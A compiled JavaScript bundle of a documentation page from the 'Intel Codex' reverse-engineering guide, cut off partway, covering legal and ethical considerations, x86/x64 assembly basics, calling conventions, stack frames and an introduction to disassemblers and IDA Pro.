"use strict";(globalThis.webpackChunkgl_0_bal_01=globalThis.webpackChunkgl_0_bal_01||[]).push([[6377],{28453:(e,n,s)=>{s.d(n,{R:()=>t,x:()=>c});var r=s(96540);const i={},l=r.createContext(i);function t(e){const n=r.useContext(l);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:t(e.components),r.createElement(l.Provider,{value:n},e.children)}},30141:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>c,default:()=>h,frontMatter:()=>t,metadata:()=>r,toc:()=>a});const r=JSON.parse('{"id":"Security/Analysis/sop-reverse-engineering","title":"Reverse Engineering","description":"Binary reverse engineering: Ghidra, IDA Pro, disassembly, decompilation, debugging & exploit development for security research and CTF challenges.","source":"@site/intel-codex/Security/Analysis/sop-reverse-engineering.md","sourceDirName":"Security/Analysis","slug":"/Security/Analysis/sop-reverse-engineering","permalink":"/intel-codex/Security/Analysis/sop-reverse-engineering","draft":false,"unlisted":false,"editUrl":"https://github.com/gl0bal01/intel-codex/tree/main/intel-codex/Security/Analysis/sop-reverse-engineering.md","tags":[],"version":"current","lastUpdatedAt":null,"frontMatter":{"type":"sop","title":"Reverse Engineering","description":"Binary reverse engineering: Ghidra, IDA Pro, disassembly, decompilation, debugging & exploit development for security research and CTF challenges.","created":"2025-10-11T00:00:00.000Z"},"sidebar":"intelCodexSidebar","previous":{"title":"Malware Analysis SOP","permalink":"/intel-codex/Security/Analysis/sop-malware-analysis"},"next":{"title":"Penetration Testing","permalink":"/intel-codex/category/penetration-testing"}}');var i=s(74848),l=s(28453);const t={type:"sop",title:"Reverse Engineering",description:"Binary reverse engineering: Ghidra, IDA Pro, disassembly, decompilation, debugging & exploit development for security research and CTF challenges.",created:new Date("2025-10-11T00:00:00.000Z")},c="Reverse Engineering",d={},a=[{value:"Table of Contents",id:"table-of-contents",level:2},{value:"Overview",id:"overview",level:2},{value:"What is Reverse Engineering?",id:"what-is-reverse-engineering",level:3},{value:"Legal &amp; Ethical Considerations",id:"legal--ethical-considerations",level:3},{value:"Reverse Engineering Methodology",id:"reverse-engineering-methodology",level:3},{value:"Reverse Engineering Fundamentals",id:"reverse-engineering-fundamentals",level:2},{value:"Assembly Language Basics",id:"assembly-language-basics",level:3},{value:"x86/x64 Assembly Fundamentals",id:"x86x64-assembly-fundamentals",level:3},{value:"Calling Conventions",id:"calling-conventions",level:3},{value:"Stack Frames",id:"stack-frames",level:3},{value:"Static Analysis",id:"static-analysis",level:2},{value:"Disassemblers &amp; Decompilers",id:"disassemblers--decompilers",level:3},{value:"IDA Pro Basics",id:"ida-pro-basics",level:3},{value:"Ghidra Basics",id:"ghidra-basics",level:3},{value:"String Analysis",id:"string-analysis",level:3},{value:"Import/Export Analysis",id:"importexport-analysis",level:3},{value:"Dynamic Analysis",id:"dynamic-analysis",level:2},{value:"Debuggers",id:"debuggers",level:3},{value:"x64dbg Basics",id:"x64dbg-basics",level:3},{value:"GDB Basics",id:"gdb-basics",level:3},{value:"Bypassing Anti-Debugging",id:"bypassing-anti-debugging",level:3},{value:"Dynamic Instrumentation (Frida)",id:"dynamic-instrumentation-frida",level:3},{value:"Platform-Specific Reversing",id:"platform-specific-reversing",level:2},{value:"Windows PE Format",id:"windows-pe-format",level:3},{value:"Linux ELF Format",id:"linux-elf-format",level:3},{value:".NET Reversing",id:"net-reversing",level:3},{value:"Android APK Reversing",id:"android-apk-reversing",level:3},{value:"Anti-Reversing Techniques",id:"anti-reversing-techniques",level:2},{value:"Obfuscation",id:"obfuscation",level:3},{value:"Packing",id:"packing",level:3},{value:"Anti-Debugging Techniques",id:"anti-debugging-techniques",level:3},{value:"Code Virtualization",id:"code-virtualization",level:3},{value:"Exploit Development",id:"exploit-development",level:2},{value:"Buffer Overflows",id:"buffer-overflows",level:3},{value:"Return-Oriented Programming (ROP)",id:"return-oriented-programming-rop",level:3},{value:"Shellcode Development",id:"shellcode-development",level:3},{value:"Bypassing Protections",id:"bypassing-protections",level:3},{value:"Practical Workflows",id:"practical-workflows",level:2},{value:"Crackme Challenges",id:"crackme-challenges",level:3},{value:"Patching Binaries",id:"patching-binaries",level:3},{value:"Malware Analysis Integration",id:"malware-analysis-integration",level:3},{value:"CTF Binary Exploitation",id:"ctf-binary-exploitation",level:3},{value:"Tools Reference",id:"tools-reference",level:2},{value:"Disassemblers &amp; Decompilers",id:"disassemblers--decompilers-1",level:3},{value:"Debuggers",id:"debuggers-1",level:3},{value:"Dynamic Instrumentation",id:"dynamic-instrumentation",level:3},{value:"Platform-Specific Tools",id:"platform-specific-tools",level:3},{value:"Exploit Development",id:"exploit-development-1",level:3},{value:"Utilities",id:"utilities",level:3},{value:"Learning Resources",id:"learning-resources",level:2},{value:"Books",id:"books",level:3},{value:"Practice Platforms",id:"practice-platforms",level:3},{value:"Online Courses",id:"online-courses",level:3},{value:"Reference Resources",id:"reference-resources",level:2},{value:"Comprehensive Knowledge Bases",id:"comprehensive-knowledge-bases",level:3},{value:"Assembly &amp; Architecture Resources",id:"assembly--architecture-resources",level:3},{value:"Tool Documentation",id:"tool-documentation",level:3},{value:"Binary Formats",id:"binary-formats",level:3},{value:"Exploit Development Resources",id:"exploit-development-resources",level:3},{value:"Cheat Sheets &amp; Quick References",id:"cheat-sheets--quick-references",level:3},{value:"Disassembly Patterns &amp; Idioms",id:"disassembly-patterns--idioms",level:3},{value:"Anti-Reversing &amp; Obfuscation",id:"anti-reversing--obfuscation",level:3},{value:"Practice Platforms",id:"practice-platforms-1",level:3},{value:"CTF Write-ups &amp; Solutions",id:"ctf-write-ups--solutions",level:3},{value:"Blogs &amp; Research",id:"blogs--research",level:3},{value:"Debugging &amp; Dynamic Analysis",id:"debugging--dynamic-analysis",level:3},{value:"Binary Analysis Tools",id:"binary-analysis-tools",level:3},{value:"Platform-Specific Resources",id:"platform-specific-resources",level:3},{value:"Pwntools &amp; Automation",id:"pwntools--automation",level:3},{value:"Books &amp; Courses",id:"books--courses",level:3},{value:"Community &amp; Forums",id:"community--forums",level:3}];function o(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",mdxAdmonitionTitle:"mdxAdmonitionTitle",mermaid:"mermaid",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,l.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)(n.admonition,{type:"danger",children:[(0,i.jsxs)(n.mdxAdmonitionTitle,{children:["Synced from an ",(0,i.jsx)(n.strong,{children:"Obsidian vault"})]}),(0,i.jsxs)(n.p,{children:["For graph and advanced features, download the ",(0,i.jsx)(n.strong,{children:"full"})," ",(0,i.jsx)(n.strong,{children:(0,i.jsx)(n.a,{href:"https://github.com/gl0bal01/intel-codex",children:"Intel Codex Vault"})})," and open it in ",(0,i.jsx)(n.strong,{children:"Obsidian"}),"."]})]}),"\n",(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"reverse-engineering",children:"Reverse Engineering"})}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Purpose:"})," Comprehensive guide to reverse engineering binaries, understanding assembly code, bypassing protections, and developing exploits for security research, malware analysis, and CTF competitions."]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"table-of-contents",children:"Table of Contents"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#overview",children:"Overview"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#reverse-engineering-fundamentals",children:"Reverse Engineering Fundamentals"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#static-analysis",children:"Static Analysis"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#dynamic-analysis",children:"Dynamic Analysis"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#platform-specific-reversing",children:"Platform-Specific Reversing"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#anti-reversing-techniques",children:"Anti-Reversing Techniques"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#exploit-development",children:"Exploit Development"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#practical-workflows",children:"Practical Workflows"})}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"#tools-reference",children:"Tools Reference"})}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"overview",children:"Overview"}),"\n",(0,i.jsx)(n.h3,{id:"what-is-reverse-engineering",children:"What is Reverse Engineering?"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Reverse engineering"})," is the process of analyzing a compiled binary (executable, library, firmware) to understand its functionality, identify vulnerabilities, or modify its behavior without access to source code."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Common use cases:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Malware analysis:"})," Understanding malicious binaries"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Vulnerability research:"})," Finding security flaws in proprietary software"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Exploit development:"})," Creating proof-of-concept exploits for vulnerabilities"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"CTF competitions:"})," Solving binary exploitation and reverse engineering challenges"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Software auditing:"})," Verifying security of closed-source applications"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"License verification:"})," Analyzing software protection mechanisms (ethical use only)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Interoperability:"})," Understanding proprietary protocols or file formats"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"legal--ethical-considerations",children:"Legal & Ethical Considerations"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Legal risks:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"DMCA Section 1201 (US):"})," Prohibits circumventing technological protection measures (DRM, software activation)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Computer Fraud and Abuse Act (CFAA):"})," Unauthorized access to computer systems"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Software license agreements:"})," May prohibit reverse engineering (enforceability varies)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Copyright law:"})," Reverse engineering for interoperability generally permitted (fair use)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Ethical guidelines:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u2705 Reverse engineering for security research (responsible disclosure)"}),"\n",(0,i.jsx)(n.li,{children:"\u2705 Analyzing malware in isolated environments"}),"\n",(0,i.jsx)(n.li,{children:"\u2705 CTF competitions and educational challenges"}),"\n",(0,i.jsx)(n.li,{children:"\u2705 Interoperability and compatibility research"}),"\n",(0,i.jsx)(n.li,{children:"\u274c Circumventing software licensing for piracy"}),"\n",(0,i.jsx)(n.li,{children:"\u274c Developing exploits for malicious purposes"}),"\n",(0,i.jsx)(n.li,{children:"\u274c Violating terms of service without authorization"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Best practices:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Obtain authorization before reversing proprietary software"}),"\n",(0,i.jsx)(n.li,{children:"Use isolated lab environments (VMs, air-gapped systems)"}),"\n",(0,i.jsx)(n.li,{children:"Follow responsible disclosure for vulnerabilities"}),"\n",(0,i.jsx)(n.li,{children:"Respect intellectual property rights"}),"\n",(0,i.jsx)(n.li,{children:"Document legal basis for reverse engineering activities"}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"reverse-engineering-methodology",children:"Reverse Engineering Methodology"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Standard workflow:"})}),"\n",(0,i.jsx)(n.mermaid,{value:"graph TD\n    A[Obtain Binary] --\x3e B[Initial Triage]\n    B --\x3e C[Static Analysis]\n    C --\x3e D[Dynamic Analysis]\n    D --\x3e E[Hypothesis Formation]\n    E --\x3e F{Goal Achieved?}\n    F --\x3e|No| C\n    F --\x3e|Yes| G[Documentation]\n    G --\x3e H[Exploit/Report]"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Step-by-step:"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Triage:"})," Identify file type, architecture, protections"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Static analysis:"})," Disassemble, decompile, analyze strings/imports"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Dynamic analysis:"})," Debug, trace execution, monitor behavior"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Iterative refinement:"})," Alternate between static/dynamic until goal achieved"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Documentation:"})," Document findings, create exploits or reports"]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"reverse-engineering-fundamentals",children:"Reverse Engineering Fundamentals"}),"\n",(0,i.jsx)(n.h3,{id:"assembly-language-basics",children:"Assembly Language Basics"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Why assembly matters:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Compiled binaries are machine code (assembly is human-readable representation)"}),"\n",(0,i.jsx)(n.li,{children:"Understanding assembly is essential for reversing (no source code available)"}),"\n",(0,i.jsx)(n.li,{children:"Different architectures have different instruction sets (x86, ARM, MIPS)"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Common architectures:"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Architecture"}),(0,i.jsx)(n.th,{children:"Bit Width"}),(0,i.jsx)(n.th,{children:"Common Use"}),(0,i.jsx)(n.th,{children:"Examples"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"x86"})}),(0,i.jsx)(n.td,{children:"32-bit"}),(0,i.jsx)(n.td,{children:"Legacy Windows, Linux"}),(0,i.jsx)(n.td,{children:"EXE, ELF (32-bit)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"x64 (x86-64)"})}),(0,i.jsx)(n.td,{children:"64-bit"}),(0,i.jsx)(n.td,{children:"Modern Windows, Linux, macOS"}),(0,i.jsx)(n.td,{children:"EXE, ELF, Mach-O (64-bit)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"ARM"})}),(0,i.jsx)(n.td,{children:"32/64-bit"}),(0,i.jsx)(n.td,{children:"Mobile devices, IoT, Apple Silicon"}),(0,i.jsx)(n.td,{children:"Android, iOS, embedded systems"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"MIPS"})}),(0,i.jsx)(n.td,{children:"32/64-bit"}),(0,i.jsx)(n.td,{children:"Routers, embedded systems"}),(0,i.jsx)(n.td,{children:"Firmware"})]})]})]}),"\n",(0,i.jsx)(n.h3,{id:"x86x64-assembly-fundamentals",children:"x86/x64 Assembly Fundamentals"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Registers (x86 32-bit):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; General-purpose registers:\nEAX - Accumulator (arithmetic, return values)\nEBX - Base (pointer to data)\nECX - Counter (loop counters)\nEDX - Data (I/O, arithmetic)\n\n; Pointer registers:\nESP - Stack Pointer (top of stack)\nEBP - Base Pointer (stack frame base)\nESI - Source Index (string/memory operations)\nEDI - Destination Index (string/memory operations)\n\n; Instruction pointer:\nEIP - Instruction Pointer (next instruction address)\n\n; Flags register:\nEFLAGS - Flags (Zero Flag, Carry Flag, Sign Flag, etc.)\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Registers (x64 64-bit):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; x64 extends 32-bit registers to 64-bit:\nRAX, RBX, RCX, RDX, RSI, RDI, RSP, RBP, RIP\n\n; Additional registers (r8-r15):\nR8, R9, R10, R11, R12, R13, R14, R15\n\n; Lower 32-bit access:\nEAX (lower 32 bits of RAX)\nR8D (lower 32 bits of R8)\n\n; Lower 16-bit access:\nAX (lower 16 bits of RAX)\nR8W (lower 16 bits of R8)\n\n; Lower 8-bit access:\nAL (lower 8 bits of RAX)\nR8B (lower 8 bits of R8)\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Common instructions:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; Data movement:\nmov eax, 0x42          ; Move value 0x42 into EAX\nlea eax, [ebp-0x10]    ; Load effective address (pointer arithmetic)\npush eax               ; Push EAX onto stack, decrement ESP\npop eax                ; Pop top of stack into EAX, increment ESP\n\n; Arithmetic:\nadd eax, ebx           ; EAX = EAX + EBX\nsub eax, 0x10          ; EAX = EAX - 0x10\ninc eax                ; EAX = EAX + 1\ndec eax                ; EAX = EAX - 1\nmul ebx                ; EAX = EAX * EBX (unsigned)\nimul ebx               ; EAX = EAX * EBX (signed)\ndiv ebx                ; EAX = EAX / EBX, EDX = remainder\n\n; Logical operations:\nand eax, 0xFF          ; Bitwise AND (mask lower 8 bits)\nor eax, ebx            ; Bitwise OR\nxor eax, eax           ; XOR (common idiom to zero register: EAX = 0)\nnot eax                ; Bitwise NOT (invert all bits)\nshl eax, 2             ; Shift left (multiply by 4)\nshr eax, 2             ; Shift right (divide by 4)\n\n; Control flow:\ncmp eax, ebx           ; Compare EAX and EBX (sets flags)\ntest eax, eax          ; Bitwise AND, set flags (check if zero)\njmp 0x401000           ; Unconditional jump\nje 0x401000            ; Jump if equal (ZF=1)\njne 0x401000           ; Jump if not equal (ZF=0)\njg 0x401000            ; Jump if greater (signed)\njl 0x401000            ; Jump if less (signed)\nja 0x401000            ; Jump if above (unsigned)\njb 0x401000            ; Jump if below (unsigned)\ncall 0x401000          ; Call function (push return address, jump)\nret                    ; Return from function (pop return address, jump)\n\n; String operations:\nrep movsb              ; Repeat: move byte from ESI to EDI, decrement ECX\nrep stosb              ; Repeat: store AL at EDI, decrement ECX\n"})}),"\n",(0,i.jsx)(n.h3,{id:"calling-conventions",children:"Calling Conventions"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Calling conventions"})," define how functions receive arguments and return values."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Windows x86 (32-bit):"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"stdcall (WinAPI standard):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:'; Arguments pushed right-to-left onto stack\n; Callee cleans up stack (ret 0xN)\n\n; Example: MessageBoxA(NULL, "Hello", "Title", MB_OK)\npush 0                 ; MB_OK (arg 4)\npush offset aTitle     ; "Title" (arg 3)\npush offset aHello     ; "Hello" (arg 2)\npush 0                 ; NULL (arg 1)\ncall MessageBoxA\n; Callee (MessageBoxA) cleans stack with "ret 0x10"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"cdecl (C standard):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:'; Arguments pushed right-to-left onto stack\n; Caller cleans up stack (add esp, 0xN)\n\n; Example: printf("Value: %d", 42)\npush 42                ; arg 2\npush offset aFormat    ; "Value: %d" (arg 1)\ncall printf\nadd esp, 0x8           ; Caller cleans stack (2 args * 4 bytes)\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"fastcall:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; First 2 arguments in ECX, EDX\n; Remaining arguments on stack\n\n; Example: fastcall_func(1, 2, 3, 4)\npush 4                 ; arg 4 (stack)\npush 3                 ; arg 3 (stack)\nmov edx, 2             ; arg 2 (register)\nmov ecx, 1             ; arg 1 (register)\ncall fastcall_func\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Windows x64:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Microsoft x64 calling convention:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:'; First 4 arguments in registers: RCX, RDX, R8, R9\n; Remaining arguments on stack\n; Caller allocates 32-byte "shadow space" on stack\n; Caller cleans stack\n\n; Example: func(1, 2, 3, 4, 5, 6)\nsub rsp, 0x28          ; Allocate shadow space (32 bytes) + align\nmov qword [rsp+0x28], 6  ; arg 6 (stack)\nmov qword [rsp+0x20], 5  ; arg 5 (stack)\nmov r9, 4              ; arg 4 (register)\nmov r8, 3              ; arg 3 (register)\nmov rdx, 2             ; arg 2 (register)\nmov rcx, 1             ; arg 1 (register)\ncall func\nadd rsp, 0x28          ; Clean up\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Linux x64 (System V AMD64 ABI):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; First 6 arguments in registers: RDI, RSI, RDX, RCX, R8, R9\n; Remaining arguments on stack\n; Return value in RAX\n\n; Example: func(1, 2, 3, 4, 5, 6, 7)\npush 7                 ; arg 7 (stack)\nmov r9, 6              ; arg 6 (register)\nmov r8, 5              ; arg 5 (register)\nmov rcx, 4             ; arg 4 (register)\nmov rdx, 3             ; arg 3 (register)\nmov rsi, 2             ; arg 2 (register)\nmov rdi, 1             ; arg 1 (register)\ncall func\nadd rsp, 0x8           ; Clean up\n"})}),"\n",(0,i.jsx)(n.h3,{id:"stack-frames",children:"Stack Frames"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Function prologue (setup stack frame):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"push ebp               ; Save old base pointer\nmov ebp, esp           ; Set new base pointer (current stack top)\nsub esp, 0x20          ; Allocate 32 bytes for local variables\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Stack layout:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"High memory\n-----------------\n[Return address]   <-- Pushed by CALL instruction\n[Saved EBP]        <-- EBP points here\n[Local var 1]      <-- EBP-0x4\n[Local var 2]      <-- EBP-0x8\n[Local var 3]      <-- EBP-0xC\n...                <-- ESP points here (top of stack)\nLow memory\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Function epilogue (cleanup stack frame):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"mov esp, ebp           ; Restore stack pointer\npop ebp                ; Restore old base pointer\nret                    ; Return to caller (pop return address, jump)\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Accessing arguments and local variables:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; Arguments (above EBP):\nmov eax, [ebp+0x8]     ; First argument (after return address)\nmov ebx, [ebp+0xC]     ; Second argument\n\n; Local variables (below EBP):\nmov [ebp-0x4], eax     ; Store EAX in local var 1\nmov ecx, [ebp-0x8]     ; Load local var 2 into ECX\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"static-analysis",children:"Static Analysis"}),"\n",(0,i.jsx)(n.h3,{id:"disassemblers--decompilers",children:"Disassemblers & Decompilers"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Static analysis"})," examines the binary without executing it."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Popular tools:"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Tool"}),(0,i.jsx)(n.th,{children:"Type"}),(0,i.jsx)(n.th,{children:"Platform"}),(0,i.jsx)(n.th,{children:"Strengths"}),(0,i.jsx)(n.th,{children:"Cost"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"IDA Pro"})}),(0,i.jsx)(n.td,{children:"Disassembler/Decompiler"}),(0,i.jsx)(n.td,{children:"Windows, Linux, macOS"}),(0,i.jsx)(n.td,{children:"Industry standard, Hex-Rays decompiler, scripting (IDAPython)"}),(0,i.jsx)(n.td,{children:"Commercial ($$$)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Ghidra"})}),(0,i.jsx)(n.td,{children:"Disassembler/Decompiler"}),(0,i.jsx)(n.td,{children:"Windows, Linux, macOS"}),(0,i.jsx)(n.td,{children:"Free, NSA-developed, excellent decompiler, Java/Python scripting"}),(0,i.jsx)(n.td,{children:"Free"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Binary Ninja"})}),(0,i.jsx)(n.td,{children:"Disassembler/Decompiler"}),(0,i.jsx)(n.td,{children:"Windows, Linux, macOS"}),(0,i.jsx)(n.td,{children:"Modern UI, BNIL (intermediate language), Python API"}),(0,i.jsx)(n.td,{children:"Commercial ($$)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Radare2"})}),(0,i.jsx)(n.td,{children:"Disassembler"}),(0,i.jsx)(n.td,{children:"Windows, Linux, macOS"}),(0,i.jsx)(n.td,{children:"CLI-based, scriptable, FLIRT signatures"}),(0,i.jsx)(n.td,{children:"Free"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Hopper"})}),(0,i.jsx)(n.td,{children:"Disassembler/Decompiler"}),(0,i.jsx)(n.td,{children:"macOS, Linux"}),(0,i.jsx)(n.td,{children:"macOS/iOS focus, ARM support"}),(0,i.jsx)(n.td,{children:"Commercial ($)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Cutter"})}),(0,i.jsx)(n.td,{children:"Disassembler"}),(0,i.jsx)(n.td,{children:"Windows, Linux, macOS"}),(0,i.jsx)(n.td,{children:"GUI for Radare2"}),(0,i.jsx)(n.td,{children:"Free"})]})]})]}),"\n",(0,i.jsx)(n.h3,{id:"ida-pro-basics",children:"IDA Pro Basics"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Loading a binary:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Launch IDA Pro (Windows):\nida64.exe malware.exe\n\n# Linux:\n./ida64 malware.elf\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Key IDA features:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. Disassembly view:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:".text:00401000 55                    push    ebp\n.text:00401001 8B EC                 mov     ebp, esp\n.text:00401003 83 EC 20              sub     esp, 20h\n.text:00401006 C7 45 FC 00 00 00 00  mov     dword ptr [ebp-4], 0\n.text:0040100D EB 09                 jmp     short loc_401018\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"2. Hex-Rays decompiler (F5):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'int __cdecl main(int argc, const char **argv) {\n    int counter = 0;\n    while (counter < 10) {\n        printf("Counter: %d\\n", counter);\n        counter++;\n    }\n    return 0;\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Strings window 